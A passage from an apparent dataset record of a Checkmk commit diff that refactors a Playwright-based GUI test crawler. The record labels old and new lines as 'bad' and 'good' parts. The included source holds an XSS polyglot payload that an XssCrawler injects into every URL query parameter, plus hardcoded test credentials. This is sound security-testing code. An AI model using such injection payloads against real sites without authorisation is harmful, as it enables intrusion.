          if search_limited_urls:\n-                        self._find_more_urls = progress.done_total < self._max_urls\n-                    self.duration = progress.duration\n-            await browser.close()\n-\n-    async def access_storage_state(\n+            try:\n+                browser_context = await self.setup_checkmk_context(browser)\n+                storage_state = await browser_context.storage_state()\n+                # makes sure authentication cookies is also available in the \"requests\" session.\n+                for cookie_dict in storage_state[\"cookies\"]:\n+                    self.requests_session.cookies.set(\n+                        name=cookie_dict[\"name\"],\n+                        value=cookie_dict[\"value\"],\n+                    )\n+                for url in urls:\n+                    logger.debug(\"Checking URL %s\", url.url)\n+                    num_done += await self.visit_url(browser_context, url)\n+            finally:\n+                await browser.close()\n+        return num_done\n+\n+    async def crawl(self, max_tasks: int, max_url_batch_size: int = 100) -> None:\n+        # special-case\n+        search_limited_urls: bool = self._max_urls > 0\n+        if search_limited_urls and self._max_urls < max_tasks:\n+            max_tasks = self._max_urls\n+        with Progress() as progress:\n+            tasks: set = set()\n+            while tasks or self._todos and self._find_more_urls:\n+                while len(tasks) < max_tasks and self._todos:\n+                    urls = [self._todos.popleft() for _ in range(max_url_batch_size) if self._todos]\n+                    tasks.add(asyncio.create_task(self.batch_test_urls(urls)))\n+                if len(tasks) >= max_tasks:\n+                    logger.debug(\"Maximum tasks assigned. Waiting for tasks to be completed ...\")\n+                done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)\n+                progress.done(done=sum(task.result() for task in done))\n+                if search_limited_urls:\n+                    self._find_more_urls = progress.done_total < self._max_urls\n+                self.duration = progress.duration\n+\n+    async def setup_checkmk_context(\n         self, browser: playwright.async_api.Browser\n-    ) -> playwright.async_api.StorageState:\n+    ) -> playwright.async_api.BrowserContext:\n         context = await browser.new_context()\n         page = await context.new_page()\n \n@@ -235,16 +240,15 @@ async def handle_page_error(error: playwright.async_api.Error) -> None:\n \n         page.on(\"pageerror\", handle_page_error)\n \n-        await page.goto(self.site.internal_url)\n+        # We allow a 120s timeout since a very new page might take a while to setup\n+        await page.goto(self.site.internal_url, timeout=120000)\n         await page.fill('input[name=\"_username\"]', \"cmkadmin\")\n         await page.fill('input[name=\"_password\"]', \"cmk\")\n         async with page.expect_navigation():\n             await page.click(\"text=Login\")\n         await page.close()\n-        storage_state = await context.storage_state()\n-        await context.close()\n \n-        return storage_state\n+        return context\n \n     def _ensure_result(self, url: Url) -> None:\n         if url.url not in self.results:\n",
            "message": "",
            "files": {
                "/tests/testlib/crawler.py": {
                    "changes": [
                        {
                            "diff": "\n import re\n import tarfile\n import time\n+import traceback\n from collections import deque\n from collections.abc import Generator, Iterable, MutableSequence\n from dataclasses import dataclass, field\n from itertools import chain\n from pathlib import Path\n from types import TracebackType\n-from typing import NamedTuple\n+from typing import NamedTuple, Sequence\n from urllib.parse import parse_qs, parse_qsl, urlencode, urljoin, urlparse, urlsplit, urlunsplit\n \n import playwright.async_api\n",
                            "add": 2,
                            "remove": 1,
                            "filename": "/tests/testlib/crawler.py",
                            "badparts": [
                                "from typing import NamedTuple"
                            ],
                            "goodparts": [
                                "import traceback",
                                "from typing import NamedTuple, Sequence"
                            ]
                        },
                        {
                            "diff": "\n         self._max_urls = max(0, max_urls)\n         self._todos = deque([Url(self.site.internal_url)])\n \n-    async def crawl(self, max_tasks: int) -> None:\n+    async def batch_test_urls(self, urls: Sequence[Url]) -> int:\n+        num_done = 0\n         async with async_playwright() as pw:\n             browser = await pw.chromium.launch()\n-            storage_state = await self.access_storage_state(browser)\n-            # makes sure authentication cookies is also available in the \"requests\" session.\n-            for cookie_dict in storage_state[\"cookies\"]:\n-                self.requests_session.cookies.set(\n-                    name=cookie_dict[\"name\"],\n-                    value=cookie_dict[\"value\"],\n-                )\n-            browser_context = await browser.new_context(storage_state=storage_state)\n-            # special-case\n-            search_limited_urls: bool = self._max_urls > 0\n-            if search_limited_urls and self._max_urls < max_tasks:\n-                max_tasks = self._max_urls\n-            with Progress() as progress:\n-                tasks: set = set()\n-                while tasks or self._todos and self._find_more_urls:\n-                    try:\n-                        url = self._todos.popleft()\n-                    except IndexError:\n-                        logger.debug(\"Populating URLs/TODOs ...\")\n-                        url = None\n-                    if url and len(tasks) < max_tasks:\n-                        logger.debug(\"Checking URL %s\", url.url)\n-                        tasks.add(asyncio.create_task(self.visit_url(browser_context, url)))\n-                    else:\n-                        logger.debug(\n-                            \"Maximum tasks assgined. Waiting for tasks to be completed ...\"\n-                        )\n-                    done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)\n-                    progress.done(done=sum(1 for t in done if t.result()))\n-                    if search_limited_urls:\n-                        self._find_more_urls = progress.done_total < self._max_urls\n-                    self.duration = progress.duration\n-            await browser.close()\n-\n-    async def access_storage_state(\n+            try:\n+                browser_context = await self.setup_checkmk_context(browser)\n+                storage_state = await browser_context.storage_state()\n+                # makes sure authentication cookies is also available in the \"requests\" session.\n+                for cookie_dict in storage_state[\"cookies\"]:\n+                    self.requests_session.cookies.set(\n+                        name=cookie_dict[\"name\"],\n+                        value=cookie_dict[\"value\"],\n+                    )\n+                for url in urls:\n+                    logger.debug(\"Checking URL %s\", url.url)\n+                    num_done += await self.visit_url(browser_context, url)\n+            finally:\n+                await browser.close()\n+        return num_done\n+\n+    async def crawl(self, max_tasks: int, max_url_batch_size: int = 100) -> None:\n+        # special-case\n+        search_limited_urls: bool = self._max_urls > 0\n+        if search_limited_urls and self._max_urls < max_tasks:\n+            max_tasks = self._max_urls\n+        with Progress() as progress:\n+            tasks: set = set()\n+            while tasks or self._todos and self._find_more_urls:\n+                while len(tasks) < max_tasks and self._todos:\n+                    urls = [self._todos.popleft() for _ in range(max_url_batch_size) if self._todos]\n+                    tasks.add(asyncio.create_task(self.batch_test_urls(urls)))\n+                if len(tasks) >= max_tasks:\n+                    logger.debug(\"Maximum tasks assigned. Waiting for tasks to be completed ...\")\n+                done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)\n+                progress.done(done=sum(task.result() for task in done))\n+                if search_limited_urls:\n+                    self._find_more_urls = progress.done_total < self._max_urls\n+                self.duration = progress.duration\n+\n+    async def setup_checkmk_context(\n         self, browser: playwright.async_api.Browser\n-    ) -> playwright.async_api.StorageState:\n+    ) -> playwright.async_api.BrowserContext:\n         context = await browser.new_context()\n         page = await context.new_page()\n \n",
                            "add": 39,
                            "remove": 37,
                            "filename": "/tests/testlib/crawler.py",
                            "badparts": [
                                "    async def crawl(self, max_tasks: int) -> None:",
                                "            storage_state = await self.access_storage_state(browser)",
                                "            for cookie_dict in storage_state[\"cookies\"]:",
                                "                self.requests_session.cookies.set(",
                                "                    name=cookie_dict[\"name\"],",
                                "                    value=cookie_dict[\"value\"],",
                                "                )",
                                "            browser_context = await browser.new_context(storage_state=storage_state)",
                                "            search_limited_urls: bool = self._max_urls > 0",
                                "            if search_limited_urls and self._max_urls < max_tasks:",
                                "                max_tasks = self._max_urls",
                                "            with Progress() as progress:",
                                "                tasks: set = set()",
                                "                while tasks or self._todos and self._find_more_urls:",
                                "                    try:",
                                "                        url = self._todos.popleft()",
                                "                    except IndexError:",
                                "                        logger.debug(\"Populating URLs/TODOs ...\")",
                                "                        url = None",
                                "                    if url and len(tasks) < max_tasks:",
                                "                        logger.debug(\"Checking URL %s\", url.url)",
                                "                        tasks.add(asyncio.create_task(self.visit_url(browser_context, url)))",
                                "                    else:",
                                "                        logger.debug(",
                                "                            \"Maximum tasks assgined. Waiting for tasks to be completed ...\"",
                                "                        )",
                                "                    done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)",
                                "                    progress.done(done=sum(1 for t in done if t.result()))",
                                "                    if search_limited_urls:",
                                "                        self._find_more_urls = progress.done_total < self._max_urls",
                                "                    self.duration = progress.duration",
                                "            await browser.close()",
                                "    async def access_storage_state(",
                                "    ) -> playwright.async_api.StorageState:"
                            ],
                            "goodparts": [
                                "    async def batch_test_urls(self, urls: Sequence[Url]) -> int:",
                                "        num_done = 0",
                                "            try:",
                                "                browser_context = await self.setup_checkmk_context(browser)",
                                "                storage_state = await browser_context.storage_state()",
                                "                for cookie_dict in storage_state[\"cookies\"]:",
                                "                    self.requests_session.cookies.set(",
                                "                        name=cookie_dict[\"name\"],",
                                "                        value=cookie_dict[\"value\"],",
                                "                    )",
                                "                for url in urls:",
                                "                    logger.debug(\"Checking URL %s\", url.url)",
                                "                    num_done += await self.visit_url(browser_context, url)",
                                "            finally:",
                                "                await browser.close()",
                                "        return num_done",
                                "    async def crawl(self, max_tasks: int, max_url_batch_size: int = 100) -> None:",
                                "        search_limited_urls: bool = self._max_urls > 0",
                                "        if search_limited_urls and self._max_urls < max_tasks:",
                                "            max_tasks = self._max_urls",
                                "        with Progress() as progress:",
                                "            tasks: set = set()",
                                "            while tasks or self._todos and self._find_more_urls:",
                                "                while len(tasks) < max_tasks and self._todos:",
                                "                    urls = [self._todos.popleft() for _ in range(max_url_batch_size) if self._todos]",
                                "                    tasks.add(asyncio.create_task(self.batch_test_urls(urls)))",
                                "                if len(tasks) >= max_tasks:",
                                "                    logger.debug(\"Maximum tasks assigned. Waiting for tasks to be completed ...\")",
                                "                done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)",
                                "                progress.done(done=sum(task.result() for task in done))",
                                "                if search_limited_urls:",
                                "                    self._find_more_urls = progress.done_total < self._max_urls",
                                "                self.duration = progress.duration",
                                "    async def setup_checkmk_context(",
                                "    ) -> playwright.async_api.BrowserContext:"
                            ]
                        },
                        {
                            "diff": "\n \n         page.on(\"pageerror\", handle_page_error)\n \n-        await page.goto(self.site.internal_url)\n+        # We allow a 120s timeout since a very new page might take a while to setup\n+        await page.goto(self.site.internal_url, timeout=120000)\n         await page.fill('input[name=\"_username\"]', \"cmkadmin\")\n         await page.fill('input[name=\"_password\"]', \"cmk\")\n         async with page.expect_navigation():\n             await page.click(\"text=Login\")\n         await page.close()\n-        storage_state = await context.storage_state()\n-        await context.close()\n \n-        return storage_state\n+        return context\n \n     def _ensure_result(self, url: Url) -> None:\n         if url.url not in self.results:\n",
                            "add": 3,
                            "remove": 4,
                            "filename": "/tests/testlib/crawler.py",
                            "badparts": [
                                "        await page.goto(self.site.internal_url)",
                                "        storage_state = await context.storage_state()",
                                "        await context.close()",
                                "        return storage_state"
                            ],
                            "goodparts": [
                                "        await page.goto(self.site.internal_url, timeout=120000)",
                                "        return context"
                            ]
                        }
                    ],
                    "source": "\n import asyncio import io import json import logging import os import re import tarfile import time from collections import deque from collections.abc import Generator, Iterable, MutableSequence from dataclasses import dataclass, field from itertools import chain from pathlib import Path from types import TracebackType from typing import NamedTuple from urllib.parse import parse_qs, parse_qsl, urlencode, urljoin, urlparse, urlsplit, urlunsplit import playwright.async_api import requests import requests.utils from bs4 import BeautifulSoup from lxml import etree from playwright.async_api import async_playwright from tests.testlib.site import Site logger=logging.getLogger() CrashIdRegex=r\"\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12}\" CrashLinkRegex=rf\"crash\\.py\\?crash_id=({CrashIdRegex})\" class PageContent(NamedTuple): content: str logs: Iterable[str] class Progress: def __init__(self, report_interval: float=10) -> None: self.started=time.time() self.done_total=0 self.report_interval=report_interval self.next_report=0.0 def __enter__(self) -> \"Progress\": self.started=time.time() self.next_report=self.started +self.report_interval self.done_total=0 return self def __exit__( self, exc_type: type[BaseException] | None, exc_val: BaseException | None, exc_tb: TracebackType | None, ) -> None: logger.info( \"%d done in %.3f secs %s\", self.done_total, self.duration, \"\" if exc_type is None else f\"(canceled with{exc_type})\", ) @property def duration(self) -> float: return time.time() -self.started def done(self, done: int) -> None: self.done_total +=done if time.time() > self.next_report: logger.info( \"rate: %.2f per sec(%d total)\", self.done_total / self.duration, self.done_total ) self.next_report=time.time() +self.report_interval class InvalidUrl(Exception): def __init__(self, url: str, message: str) -> None: super().__init__(url, message) self.url=url self.message=message class Url: def __init__( self, url: str, orig_url: str | None=None, referer_url: str | None=None, follow: bool=True, ) -> None: self.url=url self.orig_url=orig_url self.referer_url=referer_url self.follow=follow def __hash__(self) -> int: return hash(self.url) def neutral_url(self) -> str: return \"check_mk/\" +self.url.split(\"/check_mk/\", 1)[1] def url_without_host(self) -> str: parsed=list(urlsplit(self.url)) parsed[0]=\"\" parsed[1]=\"\" return urlunsplit(parsed) @dataclass class ErrorResult: message: str referer_url: str | None=None @dataclass class CrawlSkipInfo: reason: str message: str @dataclass class CrawlResult: duration: float=0.0 skipped: CrawlSkipInfo | None=None errors: MutableSequence[ErrorResult]=field(default_factory=list) def format_js_error(error: playwright.async_api.Error) -> str: return f\"{error.name}:{error.message}\\n{error.stack}\" def try_find_frame_named_main(page: playwright.async_api.Page) -> playwright.async_api.Frame: for frame in page.frames: if frame.name==\"main\": return frame return page.main_frame class Crawler: def __init__(self, test_site: Site, report_file: str | None, max_urls: int=0) -> None: self.duration=0.0 self.results: dict[str, CrawlResult]={} self.site=test_site self.report_file=Path(report_file or self.site.result_dir()) / \"crawl.xml\" self.requests_session=requests.Session() self._find_more_urls: bool=True self._ignored_content_types: set[str]={ \"application/json\", \"application/pdf\", \"application/x-deb\", \"application/x-debian-package\", \"application/x-gzip\", \"application/x-mkp\", \"application/x-msdos-program\", \"application/x-msi\", \"application/x-pkg\", \"application/x-redhat-package-manager\", \"application/x-rpm\", \"application/x-tar\", \"application/x-tgz\", \"application/x-yaml; charset=utf-8\", \"image/gif\", \"image/png\", \"image/svg+xml\", \"text/x-c++src\", \"text/x-chdr\", \"text/x-sh\", } self._max_urls=max(0, max_urls) self._todos=deque([Url(self.site.internal_url)]) async def crawl(self, max_tasks: int) -> None: async with async_playwright() as pw: browser=await pw.chromium.launch() storage_state=await self.access_storage_state(browser) for cookie_dict in storage_state[\"cookies\"]: self.requests_session.cookies.set( name=cookie_dict[\"name\"], value=cookie_dict[\"value\"], ) browser_context=await browser.new_context(storage_state=storage_state) search_limited_urls: bool=self._max_urls > 0 if search_limited_urls and self._max_urls < max_tasks: max_tasks=self._max_urls with Progress() as progress: tasks: set=set() while tasks or self._todos and self._find_more_urls: try: url=self._todos.popleft() except IndexError: logger.debug(\"Populating URLs/TODOs...\") url=None if url and len(tasks) < max_tasks: logger.debug(\"Checking URL %s\", url.url) tasks.add(asyncio.create_task(self.visit_url(browser_context, url))) else: logger.debug( \"Maximum tasks assgined. Waiting for tasks to be completed...\" ) done, tasks=await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED) progress.done(done=sum(1 for t in done if t.result())) if search_limited_urls: self._find_more_urls=progress.done_total < self._max_urls self.duration=progress.duration await browser.close() async def access_storage_state( self, browser: playwright.async_api.Browser ) -> playwright.async_api.StorageState: context=await browser.new_context() page=await context.new_page() async def handle_page_error(error: playwright.async_api.Error) -> None: self.handle_error( Url(try_find_frame_named_main(page).url), error_type=\"JavascriptCreateError\", message=format_js_error(error), ) page.on(\"pageerror\", handle_page_error) await page.goto(self.site.internal_url) await page.fill('input[name=\"_username\"]', \"cmkadmin\") await page.fill('input[name=\"_password\"]', \"cmk\") async with page.expect_navigation(): await page.click(\"text=Login\") await page.close() storage_state=await context.storage_state() await context.close() return storage_state def _ensure_result(self, url: Url) -> None: if url.url not in self.results: self.results[url.url]=CrawlResult() def handle_error(self, url: Url, error_type: str, message: str=\"\") -> bool: self._ensure_result(url) self.results[url.url].errors.append( ErrorResult(referer_url=url.referer_url, message=f\"{error_type}:{message}\") ) logger.error(\"page error: %s: %s,(%s)\", error_type, message, url.url) return True def handle_new_reference(self, url: Url, referer_url: Url) -> bool: if referer_url.follow and url.url not in self.results: self.results[url.url]=CrawlResult() self._todos.append(url) return True return False def handle_skipped_reference(self, url: Url, reason: str, message: str) -> None: self._ensure_result(url) if self.results[url.url].skipped is None: self.results[url.url].skipped=CrawlSkipInfo( reason=reason, message=message, ) def handle_page_done(self, url: Url, duration: float) -> bool: self._ensure_result(url) self.results[url.url].duration=duration logger.info(\"page done in %.2f secs(%s)\", duration, url.url) return self.results[url.url].skipped is None and len(self.results[url.url].errors)==0 def handle_crash_reports(self) -> None: crash_reports_url=urljoin(self.site.internal_url, \"view.py?view_name=crash_reports\") try: response=self.requests_session.get(crash_reports_url) except requests.RequestException as exception: self.handle_error(Url(url=crash_reports_url), \"GetCrashReportsFailed\", str(exception)) return if response.status_code !=200: self.handle_error( Url(url=crash_reports_url), \"CrashReportsPageFailed\", str(response.status_code) ) for crash_id_match in re.finditer(rf\"crash_id=({CrashIdRegex})\", response.text): self.handle_crash_report(Url(\"unknown url\"), crash_id_match.group(1)) def handle_crash_report(self, url: Url, crash_id: str) -> bool: crash_report_url=urljoin( self.site.internal_url, f\"download_crash_report.py?crash_id={crash_id}&site={self.site.id}\", ) try: response=self.requests_session.get(crash_report_url) except requests.RequestException as exception: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"CrashReportDownloadFailed\", str(exception), ) return False status_code=response.status_code expected_status_code=200 if status_code !=expected_status_code: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"CrashReportDownloadFailed\", f\"status code:{status_code}, expected:{expected_status_code}\", ) return False content_type=response.headers.get(\"content-type\") expected_content_type=\"application/x-tgz\" if content_type !=expected_content_type: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"CrashReportDownloadFailed\", f\"content-type:{content_type}, expected:{expected_content_type}\", ) return False try: with tarfile.open(fileobj=io.BytesIO(response.content)) as tar: crash_info_file=tar.extractfile(\"crash.info\") if crash_info_file is None: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"EmptyCrashReportTarFile\", message=crash_id, ) return False crash_info=json.loads(crash_info_file.read().decode(\"utf-8\")) except tarfile.ReadError: self.handle_error( Url(url=crash_report_url, referer_url=url.url), \"InvalidCrashReportTarFile\", repr(response.content), ) return False crash_report=json.dumps(crash_info, indent=4) return self.handle_error(url, \"CrashReport\", message=crash_report) async def visit_url( self, browser_context: playwright.async_api.BrowserContext, url: Url, ) -> bool: start=time.time() content_type=self.requests_session.head(url.url).headers[\"content-type\"] if content_type.startswith(\"text/html\"): try: page_content=await self.get_page_content(browser_context, url) await self.validate(url, page_content.content, page_content.logs) except playwright.async_api.Error as e: self.handle_error(url, \"BrowserError\", repr(e)) elif any( content_type.startswith(ignored_start) for ignored_start in[\"text/plain\", \"text/csv\"] ): self.handle_skipped_reference(url, reason=\"content-type\", message=content_type) elif content_type in self._ignored_content_types: self.handle_skipped_reference(url, reason=\"content-type\", message=content_type) else: self.handle_error(url, error_type=\"UnknownContentType\", message=content_type) return self.handle_page_done(url, duration=time.time() -start) @staticmethod async def get_page_content( browser_context: playwright.async_api.BrowserContext, url: Url, ) -> PageContent: logs=[] async def handle_console_messages(msg: playwright.async_api.ConsoleMessage) -> None: location=( f\"{msg.location['url']}:{msg.location['lineNumber']}:{msg.location['columnNumber']}\" ) logs.append(f\"{msg.type}:{msg.text}({location})\") async def handle_page_error(error: playwright.async_api.Error) -> None: logs.append(format_js_error(error)) page=await browser_context.new_page() page.on(\"pageerror\", handle_page_error) page.on(\"console\", handle_console_messages) try: await page.goto(url.url, timeout=60 * 1000) return PageContent(content=await page.content(), logs=logs) finally: await page.close() async def validate(self, url: Url, text: str, logs: Iterable[str]) -> None: def blocking() -> None: soup=BeautifulSoup(text, \"lxml\") self.check_content(url, soup) self.check_links(url, soup) self.check_frames(url, soup) self.check_iframes(url, soup) self.check_logs(url, logs) loop=asyncio.get_running_loop() await loop.run_in_executor(None, blocking) def check_content(self, url: Url, soup: BeautifulSoup) -> None: if soup.find(\"div\", id=\"login\") is not None: self.handle_error(url, \"LoginError\", \"login requested\") ignore_texts=[ \"This view can only be used in mobile mode.\", \"Missing context information\", \"miss some required context information\", \"There are no metrics meeting your context filters\", \"license usage report\", ] for element in soup.select(\"div.error\"): inner_html=str(element) if not any(ignore_text in inner_html for ignore_text in ignore_texts): self.handle_error(url, \"HtmlError\", f\"Found error:{inner_html}\") def check_frames(self, url: Url, soup: BeautifulSoup) -> None: self.check_referenced(url, soup, \"frame\", \"src\") def check_iframes(self, url: Url, soup: BeautifulSoup) -> None: self.check_referenced(url, soup, \"iframe\", \"src\") def check_links(self, url: Url, soup: BeautifulSoup) -> None: self.check_referenced(url, soup, \"a\", \"href\") def check_referenced(self, referer_url: Url, soup: BeautifulSoup, tag: str, attr: str) -> None: elements=soup.find_all(tag) for element in elements: orig_url=element.get(attr) if orig_url is None: continue normalized_orig_url=self.normalize_url(orig_url) if normalized_orig_url is None: continue url=Url(normalized_orig_url, orig_url=orig_url, referer_url=referer_url.url) try: self.verify_is_valid_url(url.url) except InvalidUrl as invalid_url: self.handle_skipped_reference( url, reason=\"invalid-url\", message=invalid_url.message ) else: self.handle_new_reference(url, referer_url=referer_url) def check_logs(self, url: Url, logs: Iterable[str]) -> None: accepted_logs=[ \"Missing object for SimpleBar initiation.\", ] for log in logs: if not any(accepted_log in log for accepted_log in accepted_logs): self.handle_error(url, error_type=\"JavascriptError\", message=log) def verify_is_valid_url(self, url: str) -> None: parsed=urlsplit(url) if parsed.scheme !=\"http\": raise InvalidUrl(url, f\"invalid scheme:{parsed.scheme}\") if url.startswith(\"http://\") and not url.startswith(self.site.internal_url): raise InvalidUrl(url, \"external url\") if( not parsed.path.startswith(f\"/{self.site.id}/check_mk\") or \"../pnp4nagios/\" in parsed.path or \"../nagvis/\" in parsed.path or \"check_mk/plugin-api\" in parsed.path or \"../nagios/\" in parsed.path ): raise InvalidUrl(url, \"non Check_MK URL\") file_name=os.path.basename(parsed.path) query=dict(parse_qsl(parsed.query, keep_blank_values=True)) if \"index.py?start_url=\" in url: raise InvalidUrl(url, \"link to index with current URL\") if \"logout.py\" in url: raise InvalidUrl(url, \"logout URL\") if \"_transid=\" in url: raise InvalidUrl(url, \"action URL\") if \"selection=\" in url: raise InvalidUrl(url, \"selection URL\") if \"mode=check_manpage\" in url and \"wato.py\" in url: raise InvalidUrl(url, \"man page URL\") if \"view.py\" in url and \"filled_in=filter\" in url: raise InvalidUrl(url, \"filled in filter URL\") if \"edit_view.py\" in url: raise InvalidUrl(url, \"view editor URL\") if parsed.path.startswith(f\"/{self.site.id}/check_mk/agents/\"): raise InvalidUrl(url, \"agent download file\") if file_name==\"combined_graphs.py\" and not query.get(\"host\"): raise InvalidUrl(url, \"combined graph with unrestricted context\") if file_name==\"view.py\" and query.get(\"owner\")==\"\": raise InvalidUrl(url, \"explicit empty owner(redundant view)\") if file_name==\"werk.py\" and query.get(\"werk\") not in[ \"11363\", \"5605\", \"12908\", \"12389\", \"7352\", \"11361\", \"12149\", \"5744\", \"8350\", \"6240\", \"5958\", ]: raise InvalidUrl(url, \"Skip werk pages\") def normalize_url(self, url: str) -> str: url=urljoin(self.site.internal_url, url.rstrip(\" parsed=list(urlsplit(url)) parsed[3]=urlencode(sorted(parse_qsl(parsed[3], keep_blank_values=True))) return urlunsplit(parsed) def report(self) -> None: self.site.save_results() self._write_report_file() error_messages=list( chain.from_iterable( ( [ f\"[{url} -found on{error.referer_url}]{error.message}\" for error in result.errors ] for url, result in self.results.items() if result.errors ) ) ) if error_messages: joined_error_messages=\"\\n\".join(error_messages) raise Exception( f\"Crawled{len(self.results)} URLs in{self.duration} seconds. Failures:\\n{joined_error_messages}\" ) def _write_report_file(self) -> None: root=etree.Element(\"testsuites\") testsuite=etree.SubElement(root, \"testsuite\") tests, errors, skipped=0, 0, 0 for url, result in self.results.items(): testcase=etree.SubElement( testsuite, \"testcase\", attrib={ \"name\": url, \"classname\": \"crawled_urls\", \"time\": f\"{result.duration:.3f}\", }, ) if result.skipped is not None: skipped +=1 etree.SubElement( testcase, \"skipped\", attrib={ \"type\": result.skipped.reason, \"message\": result.skipped.message, }, ) elif result.errors: errors +=1 for error in result.errors: failure=etree.SubElement( testcase, \"failure\", attrib={\"message\": error.message} ) failure.text=f\"referer_url:{error.referer_url}\" tests +=1 testsuite.attrib[\"name\"]=\"test-gui-crawl\" testsuite.attrib[\"tests\"]=str(tests) testsuite.attrib[\"skipped\"]=str(skipped) testsuite.attrib[\"errors\"]=str(errors) testsuite.attrib[\"failures\"]=\"0\" testsuite.attrib[\"time\"]=f\"{self.duration:.3f}\" testsuite.attrib[\"timestamp\"]=time.strftime(\"%Y-%m-%dT%H:%M:%S\") self.report_file.write_bytes(etree.tostring(root, pretty_print=True)) class XssCrawler(Crawler): Payload=\"\"\"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+console.log(\"XSS vulnerability\")//'>\"\"\" def handle_error(self, url: Url, error_type: str, message: str=\"\") -> bool: if error_type==\"HtmlError\": return False if error_type==\"UnknownContentType\" and message==\"application/problem+json\": return False return super().handle_error(url, error_type, message) def handle_page_done(self, url: Url, duration: float) -> bool: if super().handle_page_done(url, duration): for mutated_url in mutate_url_with_xss_payload(url, self.Payload): super().handle_new_reference(mutated_url, url) return True return False def mutate_url_with_xss_payload(url: Url, payload: str) -> Generator[Url, None, None]: \"\"\"For each query parameter in `url`, produce a URL where that parameter is set to `payload` >>> urls=mutate_url_with_xss_payload(Url(\"example.com?foo=bar&empty=\"), \"PAYLOAD\") >>> next(urls).url 'example.com?foo=PAYLOAD&empty=' >>> next(urls).url 'example.com?foo=bar&empty=PAYLOAD' (Be aware that this doctest is not run.) \"\"\" parsed_url=urlparse(url.url) parsed_query=parse_qs(parsed_url.query, keep_blank_values=True) for key, values in parsed_query.items(): for change_idx in range(len(values)): mutated_values=[ payload if idx==change_idx else value for idx, value in enumerate(values) ] mutated_query={**parsed_query, key: mutated_values} mutated_url=parsed_url._replace(query=urlencode(mutated_query, doseq=True)) yield Url( url=mutated_url.geturl(), referer_url=url.referer_url, orig_url=url.orig_url, follow=False, ) ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# Copyright (C) 2019 Checkmk GmbH - License: GNU General Public License v2\n# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and\n# conditions defined in the file COPYING, which is part of this source code package.\n\nimport asyncio\nimport io\nimport json\nimport logging\nimport os\nimport re\nimport tarfile\nimport time\nfrom collections import deque\nfrom collections.abc import Generator, Iterable, MutableSequence\nfrom dataclasses import dataclass, field\nfrom itertools import chain\nfrom pathlib import Path\nfrom types import TracebackType\nfrom typing import NamedTuple\nfrom urllib.parse import parse_qs, parse_qsl, urlencode, urljoin, urlparse, urlsplit, urlunsplit\n\nimport playwright.async_api\nimport requests\nimport requests.utils\nfrom bs4 import BeautifulSoup\nfrom lxml import etree\nfrom playwright.async_api import async_playwright\n\nfrom tests.testlib.site import Site\n\nlogger = logging.getLogger()\n\nCrashIdRegex = r\"\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12}\"\nCrashLinkRegex = rf\"crash\\.py\\?crash_id=({CrashIdRegex})\"\n\n\nclass PageContent(NamedTuple):\n    content: str\n    logs: Iterable[str]\n\n\nclass Progress:\n    def __init__(self, report_interval: float = 10) -> None:\n        self.started = time.time()\n        self.done_total = 0\n        self.report_interval = report_interval\n        self.next_report = 0.0\n\n    def __enter__(self) -> \"Progress\":\n        self.started = time.time()\n        self.next_report = self.started + self.report_interval\n        self.done_total = 0\n        return self\n\n    def __exit__(\n        self,\n        exc_type: type[BaseException] | None,\n        exc_val: BaseException | None,\n        exc_tb: TracebackType | None,\n    ) -> None:\n        logger.info(\n            \"%d done in %.3f secs %s\",\n            self.done_total,\n            self.duration,\n            \"\" if exc_type is None else f\"(canceled with {exc_type})\",\n        )\n\n    @property\n    def duration(self) -> float:\n        return time.time() - self.started\n\n    def done(self, done: int) -> None:\n        self.done_total += done\n        if time.time() > self.next_report:\n            logger.info(\n                \"rate: %.2f per sec (%d total)\", self.done_total / self.duration, self.done_total\n            )\n            self.next_report = time.time() + self.report_interval\n\n\nclass InvalidUrl(Exception):\n    def __init__(self, url: str, message: str) -> None:\n        super().__init__(url, message)\n        self.url = url\n        self.message = message\n\n\nclass Url:\n    def __init__(\n        self,\n        url: str,\n        orig_url: str | None = None,\n        referer_url: str | None = None,\n        follow: bool = True,\n    ) -> None:\n        self.url = url\n        self.orig_url = orig_url\n        self.referer_url = referer_url\n        self.follow = follow\n\n    def __hash__(self) -> int:\n        return hash(self.url)\n\n    # Strip host and site prefix\n    def neutral_url(self) -> str:\n        return \"check_mk/\" + self.url.split(\"/check_mk/\", 1)[1]\n\n    # Strip proto and host\n    def url_without_host(self) -> str:\n        parsed = list(urlsplit(self.url))\n        parsed[0] = \"\"\n        parsed[1] = \"\"\n        return urlunsplit(parsed)\n\n\n@dataclass\nclass ErrorResult:\n    message: str\n    referer_url: str | None = None\n\n\n@dataclass\nclass CrawlSkipInfo:\n    reason: str\n    message: str\n\n\n@dataclass\nclass CrawlResult:\n    duration: float = 0.0\n    skipped: CrawlSkipInfo | None = None\n    errors: MutableSequence[ErrorResult] = field(default_factory=list)\n\n\ndef format_js_error(error: playwright.async_api.Error) -> str:\n    return f\"{error.name}: {error.message}\\n{error.stack}\"\n\n\ndef try_find_frame_named_main(page: playwright.async_api.Page) -> playwright.async_api.Frame:\n    # There are two main frames: Playwright main_frame is the outer frame, the\n    # frame named main is the frame with the name \"main\". This is where the\n    # interesting checkmk stuff is happening, so we try to find it, but fall\n    # back to the outer frame if we can not find it.\n    for frame in page.frames:\n        if frame.name == \"main\":\n            return frame\n    return page.main_frame\n\n\nclass Crawler:\n    def __init__(self, test_site: Site, report_file: str | None, max_urls: int = 0) -> None:\n        self.duration = 0.0\n        self.results: dict[str, CrawlResult] = {}\n        self.site = test_site\n        self.report_file = Path(report_file or self.site.result_dir()) / \"crawl.xml\"\n        self.requests_session = requests.Session()\n        self._find_more_urls: bool = True\n        self._ignored_content_types: set[str] = {\n            \"application/json\",\n            \"application/pdf\",\n            \"application/x-deb\",\n            \"application/x-debian-package\",\n            